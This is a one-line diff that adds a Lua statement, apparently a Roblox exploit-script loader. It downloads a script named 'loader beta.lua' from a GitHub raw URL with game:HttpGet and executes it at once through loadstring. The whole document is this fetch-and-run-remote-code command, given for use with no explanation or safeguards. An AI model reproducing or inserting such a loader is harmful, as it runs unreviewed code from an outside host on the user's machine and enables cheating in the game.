@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KirawzWeb/Script/main/loader%20beta.lua",true))()
